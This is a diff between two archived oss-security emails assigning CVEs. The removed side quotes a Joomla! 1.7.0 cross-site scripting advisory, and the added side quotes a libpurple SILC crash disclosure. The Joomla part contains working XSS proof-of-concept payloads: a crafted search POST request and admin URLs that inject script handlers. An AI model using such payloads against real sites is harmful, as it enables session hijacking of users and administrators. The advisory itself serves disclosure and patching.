@@ -1,13 +1,14 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/04/7
-Message-ID: <85aa3709-c24c-4e0c-beef-cc38b1ac0b5d@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Tue, 04 Oct 2011 14:04:21 -0400 (EDT)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/04/6
+Message-ID: <2f641b9d-06a4-463d-8a27-117f9c354051@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Tue, 04 Oct 2011 14:02:09 -0400 (EDT)
 From: Josh Bressers <bressers@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE Request: Joomla! 1.7.0 | Multiple Cross Site Scripting (XSS) Vulnerabilities
+Cc: security@...gin.im
+Subject: Re: libpurple vulnerability disclosure and fix
 Content-Type: text/plain; charset=utf-8
 
-Please use CVE-2011-3595
+Please use CVE-2011-3594.
 
 Thanks.
 
@@ -16,143 +17,49 @@ Thanks.
 
 
 ----- Original Message -----
-> Joomla! 1.7.0 | Multiple Cross Site Scripting (XSS) Vulnerabilities
+> Hello all,
 > 
+> A libpurple vulnerability was made known to the Pidgin developers via
+> our public bug tracker which affects the SILC protocol plugin and all
+> software which uses SILC via libpurple.  The original identification
+> of the vulnerability and bug report was made by Diego Bauche Madero
+> from IOActive <diego.madero@...ctive.com>, and can be seen on the
+> Pidgin bug tracker as Bug #14636:
 > 
+>     http://developer.pidgin.im/ticket/14636
 > 
-> 1. OVERVIEW
+> The vulnerability lies in calling g_markup_escape_text() on strings
+> which have not been verified as valid UTF-8.  This function is not
+> required to do anything reasonable with invalid UTF-8, and indeed
+> reads past the end of the string and will eventually segfault for
+> certain sequences in some versions of Glib 2.  Because the behavior
+> of
+> this function is undefined, and depends on the particular version of
+> Glib 2 in use, the complete ramifications of this bug are unknown.
+> Remote crashing of a libpurple client by untrusted users via
+> specifically crafted SILC messages is a verified vulnerability.
 > 
-> Joomla! 1.7.0 (stable version) is vulnerable to multiple Cross Site
-> Scripting issues.
+> This bug is believed to affect all releases of libpurple up to and
+> including version 2.10.0.
 > 
+> The correct fix for this bug is UTF-8 validation (and correction if
+> necessary) of the incoming string before passing it to Glib.  A patch
+> which provides this fix has been applied to the Pidgin sources in
+> revision 7eb1f6d56cc58bbb5b56b7df53955d36b9b419b8 and will appear in
+> all future Pidgin releases.  For reference, it is:
 > 
-> 2. BACKGROUND
+>     http://developer.pidgin.im/viewmtn/revision/diff/be5e66abad2af29604bc794cc4c6600ab12751f3/with/7eb1f6d56cc58bbb5b56b7df53955d36b9b419b8
 > 
-> Joomla is a free and open source content management system (CMS) for
-> publishing content on the World Wide Web and intranets. It comprises
-> a
-> model–view–controller (MVC) Web application framework that can also
-> be
-> used independently.
-> Joomla is written in PHP, uses object-oriented programming (OOP)
-> techniques and software design patterns, stores data in a MySQL
-> database, and includes features such as page caching, RSS feeds,
-> printable versions of pages, news flashes, blogs, polls, search, and
-> support for language internationalization.
+> All packagers of libpurple (including monolithic Pidgin and/or finch
+> packages) who have not already done so are encouraged to apply this
+> change to their packages immediately.
 > 
+> We would also like to request a CVE number for this issue.
 > 
-> 3. VULNERABILITY DESCRIPTION
+> Any sensitive follow-ups to this issue, or any other Pidgin, finch,
+> or
+> libpurple issue, may be directed to security@...gin.im.
 > 
-> Several parameters (searchword, extension, asset, author ) in Joomla!
-> Core components are not properly sanitized upon submission to the
-> /index.php url, which allows attacker to conduct Cross Site Scripting
-> attack. This may allow an attacker to create a specially crafted URL
-> that would execute arbitrary script code in a victim's browser.
-> 
-> 
-> 4. VERSION AFFECTED
-> 
-> 1.7.0 <=
-> 
-> 
-> 5. PROOF-OF-CONCEPT/EXPLOIT
-> 
-> 
-> component: com_search, parameter: searchword (Browser: IE, Konqueror)
-> =====================================================================
-> This is our previously reported issue -
-> http://bl0g.yehg.net/2011/07/joomla-170-rc-and-lower-multiple-cross.html
-> http://bl0g.yehg.net/2011/06/joomla-163-and-lower-multiple-cross.html
-> We have no idea what made Joomla! guys so difficult to fix this
-> issue.
-> 
-> 
-> [REQUEST]
-> POST /joomla17_noseo/index.php HTTP/1.1
-> Host: localhost
-> Accept: */*
-> Accept-Language: en
-> User-Agent: MSIE 8.0
-> Connection: close
-> Referer: http://localhost/joomla17_noseo
-> 
-> Content-Type: application/x-www-form-urlencoded
-> Content-Length: 456
-> 
-> 
-> task=search&Itemid=435&searchword=Search';onunload=function(){x=confirm(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,97,32,109,101,115,115,97,103,101,32,102,114,111,109,32,65,100,109,105,110,105,115,116,114,97,116,111,114,33,10,68,111,32,121,111,117,32,119,97,110,116,32,116,111,32,103,111,32,116,111,32,73,110,98,111,120,63));alert(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,88,83,83,33));};//xsssssssssss&option=com_search
-> [/REQUEST]
-> 
-> 
-> ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-> 
-> User Login is required to execute the following XSSes.
-> 
-> 
-> Parameter: extension, Component: com_categories
-> ====================================================
-> 
-> http://localhost/joomla17_noseo/administrator/index.php?option=com_categories&extension=com_content%20%22onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22%20x=%22
-> 
-> 
-> 
-> Parameter: asset , Component: com_media
-> ====================================================
-> 
-> http://localhost/joomla17_noseo/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=1%22%20onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22x=%22&author=
-> 
-> 
-> 
-> Parameter: author, Component: com_media
-> ====================================================
-> 
-> http://localhost/joomla17_noseo/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=&author=1%22%20onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22x=%22
-> 
-> 
-> 
-> ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-> 
-> 
-> 6. IMPACT
-> 
-> Attackers can compromise currently logged-in user/administrator
-> session and impersonate arbitrary user actions available under
-> /administrator/ functions.
-> 
-> 
-> 7. SOLUTION
-> 
-> Upgrade to Joomla! 1.7.1-stable or higher.
-> 
-> 
-> 8. VENDOR
-> 
-> Joomla! Developer Team
-> http://www.joomla.org
-> 
-> 
-> 9. CREDIT
-> 
-> This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-> Ethical Hacker Group, Myanmar.
-> 
-> 
-> 10. DISCLOSURE TIME-LINE
-> 
-> 2011-07-29: notified vendor
-> 2011-09-26: patched version, 1.7.1-stable, released
-> 2011-09-29: vulnerability disclosed
-> 
-> 
-> 11. REFERENCES
-> 
-> Original Advisory URL:
-> http://yehg.net/lab/pr0js/advisories/joomla/core/%5Bjoomla_1.7.0-stable%5D_cross_site_scripting%28XSS%29
-> 
-> Vendor Advisory URLs:
-> http://developer.joomla.org/security/news/367-20110901-core-xss-vulnerability
-> http://developer.joomla.org/security/news/368-20110902-core-xss-vulnerability
-> 
-> 
-> #yehg [2011-09-29]
+> Thank you,
+> Ethan
 > 
